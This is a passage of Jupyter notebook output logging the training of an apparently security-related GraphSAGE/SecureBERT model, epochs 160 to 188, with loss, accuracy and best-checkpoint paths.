      "application/vnd.jupyter.widget-view+json": {
       "model_id": "40eff7ac5db945b5be4181ece070278c",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "  0%|          | 0/53 [00:00<?, ?it/s]"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "2024-02-01 13:21:00 | INFO | Validation Loss: 0.0885 | Validation Accuracy: 0.9757\n",
      "\n"
     ]
    },
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "8ef09ec647134e0094a0515801252c8b",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "  0%|          | 0/418 [00:00<?, ?it/s]"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "2024-02-01 13:21:12 | INFO | Epoch 160 | Train Loss: 0.1016 | Train Accuracy: 0.9712\n"
     ]
    },
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "cda1fdbd241d4a3aa65f002a582c7a59",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "  0%|          | 0/53 [00:00<?, ?it/s]"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "2024-02-01 13:21:14 | INFO | Validation Loss: 0.0913 | Validation Accuracy: 0.9720\n",
      "\n"
     ]
    },
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "88eca5e5aab140e3adba13f326fb5856",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "  0%|          | 0/418 [00:00<?, ?it/s]"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "2024-02-01 13:21:25 | INFO | Epoch 161 | Train Loss: 0.1008 | Train Accuracy: 0.9716\n"
     ]
    },
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "8622f8997acd432c8ac2d793ff597614",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "  0%|          | 0/53 [00:00<?, ?it/s]"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "2024-02-01 13:21:26 | INFO | Validation Loss: 0.0836 | Validation Accuracy: 0.9751\n",
      "\n"
     ]
    },
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "075a68b56a4d43cfa656f5ea4efcb7c9",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "  0%|          | 0/418 [00:00<?, ?it/s]"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "2024-02-01 13:21:38 | INFO | Epoch 162 | Train Loss: 0.0997 | Train Accuracy: 0.9714\n"
     ]
    },
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "14e4a0527c124dbfadcc337b1ffe5854",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "  0%|          | 0/53 [00:00<?, ?it/s]"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "2024-02-01 13:21:40 | INFO | Validation Loss: 0.0836 | Validation Accuracy: 0.9755\n",
      "\n"
     ]
    },
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "ac8494ab4d4044c4882358e766df935b",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "  0%|          | 0/418 [00:00<?, ?it/s]"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "2024-02-01 13:21:52 | INFO | Epoch 163 | Train Loss: 0.1006 | Train Accuracy: 0.9714\n"
     ]
    },
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "6fe9d321fb104ef0af638af9f9a9230f",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "  0%|          | 0/53 [00:00<?, ?it/s]"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "2024-02-01 13:21:53 | INFO | Validation Loss: 0.0805 | Validation Accuracy: 0.9759\n",
      "\n"
     ]
    },
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "2f714ef5cfbd4f72b8b489b0b988b29b",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "  0%|          | 0/418 [00:00<?, ?it/s]"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "2024-02-01 13:22:05 | INFO | Epoch 164 | Train Loss: 0.0977 | Train Accuracy: 0.9722\n"
     ]
    },
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "4fef9966442f4465a6eb6b2ce9043a0c",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "  0%|          | 0/53 [00:00<?, ?it/s]"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "2024-02-01 13:22:06 | INFO | Validation Loss: 0.0848 | Validation Accuracy: 0.9741\n",
      "\n"
     ]
    },
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "9f874cffc5a64ed98e4eda4f02ff7f1f",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "  0%|          | 0/418 [00:00<?, ?it/s]"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "2024-02-01 13:22:19 | INFO | Epoch 165 | Train Loss: 0.0985 | Train Accuracy: 0.9719\n"
     ]
    },
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "09a3e40440184b02a87be2c9397b5bb8",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "  0%|          | 0/53 [00:00<?, ?it/s]"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "2024-02-01 13:22:20 | INFO | Validation Loss: 0.0710 | Validation Accuracy: 0.9799\n",
      "\n"
     ]
    },
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "7cf6ee138af24836a69ad406ad48275b",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "  0%|          | 0/418 [00:00<?, ?it/s]"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "2024-02-01 13:22:33 | INFO | Epoch 166 | Train Loss: 0.0932 | Train Accuracy: 0.9733\n"
     ]
    },
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "c9dfaa861cd24f7a92fd9ce433d4f9fb",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "  0%|          | 0/53 [00:00<?, ?it/s]"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "2024-02-01 13:22:34 | INFO | Validation Loss: 0.0805 | Validation Accuracy: 0.9771\n",
      "\n"
     ]
    },
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "f08bb5e3a43e4d718876c269878fce77",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "  0%|          | 0/418 [00:00<?, ?it/s]"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "2024-02-01 13:22:46 | INFO | Epoch 167 | Train Loss: 0.0961 | Train Accuracy: 0.9726\n"
     ]
    },
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "8a4416bea2164ad68da07908ac2a1fcf",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "  0%|          | 0/53 [00:00<?, ?it/s]"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "2024-02-01 13:22:48 | INFO | Validation Loss: 0.0654 | Validation Accuracy: 0.9806\n",
      "\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Best Model Found!!  ./model/GraphSAGE_secureBERT_256/epoch_167_loss_0.0654_acc_0.9806\n"
     ]
    },
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "5f8447ffe369401cb08674a4a7ad2fb9",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "  0%|          | 0/418 [00:00<?, ?it/s]"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "2024-02-01 13:23:01 | INFO | Epoch 168 | Train Loss: 0.0939 | Train Accuracy: 0.9732\n"
     ]
    },
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "878e94589a934d5dac9fa65577b5dc2b",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "  0%|          | 0/53 [00:00<?, ?it/s]"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "2024-02-01 13:23:02 | INFO | Validation Loss: 0.0793 | Validation Accuracy: 0.9754\n",
      "\n"
     ]
    },
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "689a7e76dcca484f8343a0dced3b8c41",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "  0%|          | 0/418 [00:00<?, ?it/s]"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "2024-02-01 13:23:14 | INFO | Epoch 169 | Train Loss: 0.0932 | Train Accuracy: 0.9732\n"
     ]
    },
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "a0a86f94e765461caaacdb62524a9edd",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "  0%|          | 0/53 [00:00<?, ?it/s]"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "2024-02-01 13:23:16 | INFO | Validation Loss: 0.0824 | Validation Accuracy: 0.9758\n",
      "\n"
     ]
    },
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "352b8bd16a154165a0e7a9ffae2b6121",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "  0%|          | 0/418 [00:00<?, ?it/s]"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "2024-02-01 13:23:28 | INFO | Epoch 170 | Train Loss: 0.0903 | Train Accuracy: 0.9743\n"
     ]
    },
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "e9fd33f14ed743e2a5c12a2f6807a9be",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "  0%|          | 0/53 [00:00<?, ?it/s]"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "2024-02-01 13:23:29 | INFO | Validation Loss: 0.0796 | Validation Accuracy: 0.9758\n",
      "\n"
     ]
    },
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "5ac769cd4e3645df8d7610bf3e514d1c",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "  0%|          | 0/418 [00:00<?, ?it/s]"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "2024-02-01 13:23:42 | INFO | Epoch 171 | Train Loss: 0.0909 | Train Accuracy: 0.9742\n"
     ]
    },
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "a0c6be2de63b4180b48b43632a4139f9",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "  0%|          | 0/53 [00:00<?, ?it/s]"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "2024-02-01 13:23:43 | INFO | Validation Loss: 0.0728 | Validation Accuracy: 0.9783\n",
      "\n"
     ]
    },
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "6815b05ca2df4cceb32428a7b6f04bca",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "  0%|          | 0/418 [00:00<?, ?it/s]"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "2024-02-01 13:23:56 | INFO | Epoch 172 | Train Loss: 0.0898 | Train Accuracy: 0.9743\n"
     ]
    },
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "128787e0d2f8467180783f69d8de11dc",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "  0%|          | 0/53 [00:00<?, ?it/s]"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "2024-02-01 13:23:57 | INFO | Validation Loss: 0.1053 | Validation Accuracy: 0.9693\n",
      "\n"
     ]
    },
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "021f9ddf19e64ccbba50e19c11adbfc9",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "  0%|          | 0/418 [00:00<?, ?it/s]"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "2024-02-01 13:24:09 | INFO | Epoch 173 | Train Loss: 0.0952 | Train Accuracy: 0.9728\n"
     ]
    },
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "9daf56a7718d4569a1d7c2a4118563e5",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "  0%|          | 0/53 [00:00<?, ?it/s]"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "2024-02-01 13:24:10 | INFO | Validation Loss: 0.0860 | Validation Accuracy: 0.9738\n",
      "\n"
     ]
    },
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "d381d01f17c54974a21198e2e603249b",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "  0%|          | 0/418 [00:00<?, ?it/s]"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "2024-02-01 13:24:22 | INFO | Epoch 174 | Train Loss: 0.0941 | Train Accuracy: 0.9728\n"
     ]
    },
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "9c59f34d455146fb85a170333ba169a0",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "  0%|          | 0/53 [00:00<?, ?it/s]"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "2024-02-01 13:24:24 | INFO | Validation Loss: 0.0820 | Validation Accuracy: 0.9759\n",
      "\n"
     ]
    },
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "fcc3adaff64642daa51b15f1624e9d3b",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "  0%|          | 0/418 [00:00<?, ?it/s]"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "2024-02-01 13:24:36 | INFO | Epoch 175 | Train Loss: 0.0916 | Train Accuracy: 0.9737\n"
     ]
    },
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "6b05c44997e24bcbabc01282f074f5d0",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "  0%|          | 0/53 [00:00<?, ?it/s]"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "2024-02-01 13:24:38 | INFO | Validation Loss: 0.0723 | Validation Accuracy: 0.9786\n",
      "\n"
     ]
    },
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "4006a71aa35e4b75bd2129c579028e22",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "  0%|          | 0/418 [00:00<?, ?it/s]"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "2024-02-01 13:24:49 | INFO | Epoch 176 | Train Loss: 0.0865 | Train Accuracy: 0.9755\n"
     ]
    },
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "99959d4d3de04f8396b6f29f78f6132a",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "  0%|          | 0/53 [00:00<?, ?it/s]"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "2024-02-01 13:24:50 | INFO | Validation Loss: 0.0855 | Validation Accuracy: 0.9747\n",
      "\n"
     ]
    },
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "96dd58db152d4d8f8070ff04c7f92cc4",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "  0%|          | 0/418 [00:00<?, ?it/s]"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "2024-02-01 13:25:02 | INFO | Epoch 177 | Train Loss: 0.0905 | Train Accuracy: 0.9742\n"
     ]
    },
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "20860526e88b4f888dee926a6c78532e",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "  0%|          | 0/53 [00:00<?, ?it/s]"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "2024-02-01 13:25:04 | INFO | Validation Loss: 0.0781 | Validation Accuracy: 0.9770\n",
      "\n"
     ]
    },
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "5fd6a92a8855433eb03e2f8d5a94c3db",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "  0%|          | 0/418 [00:00<?, ?it/s]"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "2024-02-01 13:25:16 | INFO | Epoch 178 | Train Loss: 0.0933 | Train Accuracy: 0.9734\n"
     ]
    },
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "83f9471e4ddf4cf29bb63c30687f68bf",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "  0%|          | 0/53 [00:00<?, ?it/s]"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "2024-02-01 13:25:17 | INFO | Validation Loss: 0.0779 | Validation Accuracy: 0.9758\n",
      "\n"
     ]
    },
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "186b15fe89c6473fb4f34a7035c91898",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "  0%|          | 0/418 [00:00<?, ?it/s]"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "2024-02-01 13:25:29 | INFO | Epoch 179 | Train Loss: 0.0901 | Train Accuracy: 0.9742\n"
     ]
    },
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "9fa28e6af8b047bea4771920e64a9ad6",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "  0%|          | 0/53 [00:00<?, ?it/s]"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "2024-02-01 13:25:31 | INFO | Validation Loss: 0.0739 | Validation Accuracy: 0.9781\n",
      "\n"
     ]
    },
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "cb1ed81b08c34da79d055a2c285ff779",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "  0%|          | 0/418 [00:00<?, ?it/s]"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "2024-02-01 13:25:43 | INFO | Epoch 180 | Train Loss: 0.0894 | Train Accuracy: 0.9744\n"
     ]
    },
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "5669d25191f34291abefaeb069d2f473",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "  0%|          | 0/53 [00:00<?, ?it/s]"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "2024-02-01 13:25:44 | INFO | Validation Loss: 0.0854 | Validation Accuracy: 0.9741\n",
      "\n"
     ]
    },
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "8faeb0e78346483ca6e5629f26bd61c9",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "  0%|          | 0/418 [00:00<?, ?it/s]"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "2024-02-01 13:25:56 | INFO | Epoch 181 | Train Loss: 0.0858 | Train Accuracy: 0.9756\n"
     ]
    },
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "5683ca0340784dc78562eebe6b8dbcf8",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "  0%|          | 0/53 [00:00<?, ?it/s]"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "2024-02-01 13:25:57 | INFO | Validation Loss: 0.0657 | Validation Accuracy: 0.9802\n",
      "\n"
     ]
    },
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "79af19bb99a04d8da8690f0c2855c6b1",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "  0%|          | 0/418 [00:00<?, ?it/s]"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "2024-02-01 13:26:09 | INFO | Epoch 182 | Train Loss: 0.0900 | Train Accuracy: 0.9743\n"
     ]
    },
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "40e1ddc525ff409a9934441652e0f86a",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "  0%|          | 0/53 [00:00<?, ?it/s]"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "2024-02-01 13:26:10 | INFO | Validation Loss: 0.0878 | Validation Accuracy: 0.9733\n",
      "\n"
     ]
    },
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "b31f558512064c2c8ecec76b6c73e4b5",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "  0%|          | 0/418 [00:00<?, ?it/s]"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "2024-02-01 13:26:23 | INFO | Epoch 183 | Train Loss: 0.0848 | Train Accuracy: 0.9757\n"
     ]
    },
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "9e13c4a4344e4547a8e3fe5de90bc05d",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "  0%|          | 0/53 [00:00<?, ?it/s]"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "2024-02-01 13:26:24 | INFO | Validation Loss: 0.0636 | Validation Accuracy: 0.9810\n",
      "\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Best Model Found!!  ./model/GraphSAGE_secureBERT_256/epoch_183_loss_0.0636_acc_0.9810\n"
     ]
    },
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "b98633b5761448debe493c06e1201575",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "  0%|          | 0/418 [00:00<?, ?it/s]"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "2024-02-01 13:26:36 | INFO | Epoch 184 | Train Loss: 0.0843 | Train Accuracy: 0.9758\n"
     ]
    },
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "267afac6188b4274b7a74a6dd3e8e82b",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "  0%|          | 0/53 [00:00<?, ?it/s]"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "2024-02-01 13:26:37 | INFO | Validation Loss: 0.0886 | Validation Accuracy: 0.9741\n",
      "\n"
     ]
    },
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "a11e66336da74290b3d4f5a7d6d517b4",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "  0%|          | 0/418 [00:00<?, ?it/s]"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "2024-02-01 13:26:50 | INFO | Epoch 185 | Train Loss: 0.0890 | Train Accuracy: 0.9747\n"
     ]
    },
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "16955dd549414fee9ad01da642791da5",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "  0%|          | 0/53 [00:00<?, ?it/s]"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "2024-02-01 13:26:51 | INFO | Validation Loss: 0.0725 | Validation Accuracy: 0.9787\n",
      "\n"
     ]
    },
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "1f2e4b53060e4b8493d4d873d6d83049",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "  0%|          | 0/418 [00:00<?, ?it/s]"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "2024-02-01 13:27:02 | INFO | Epoch 186 | Train Loss: 0.0882 | Train Accuracy: 0.9747\n"
     ]
    },
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "0bb141eabd534c6bbbf738b2532abbe2",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "  0%|          | 0/53 [00:00<?, ?it/s]"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "2024-02-01 13:27:04 | INFO | Validation Loss: 0.0624 | Validation Accuracy: 0.9814\n",
      "\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Best Model Found!!  ./model/GraphSAGE_secureBERT_256/epoch_186_loss_0.0624_acc_0.9814\n"
     ]
    },
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "0ff8cbe7afad4a4ba418e22442ac2556",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "  0%|          | 0/418 [00:00<?, ?it/s]"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "2024-02-01 13:27:16 | INFO | Epoch 187 | Train Loss: 0.0879 | Train Accuracy: 0.9749\n"
     ]
    },
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "8710e0410a2a4237b9687498a3e3455c",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "  0%|          | 0/53 [00:00<?, ?it/s]"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "2024-02-01 13:27:17 | INFO | Validation Loss: 0.0702 | Validation Accuracy: 0.9789\n",
      "\n"
     ]
    },
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "35d3e6cfa967423098ecfe914ef282fb",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "  0%|          | 0/418 [00:00<?, ?it/s]"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "2024-02-01 13:27:29 | INFO | Epoch 188 | Train Loss: 0.0911 | Train Accuracy: 0.9739\n"
     ]
    },
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "f4f2c342c2a54f03a2ef443b2ab4d2bc",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "  0%|          | 0/53 [00:00<?, ?it/s]"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "2024-02-01 13:27:30 | INFO | Validation Loss: 0.0763 | Validation Accuracy: 0.9784\n",
      "\n"
     ]
    },
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "5486777635c1494da291b317e25496e8",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "  0%|          | 0/418 [00:00<?, ?it/s]"
      ]
     },
     "metadata": {},
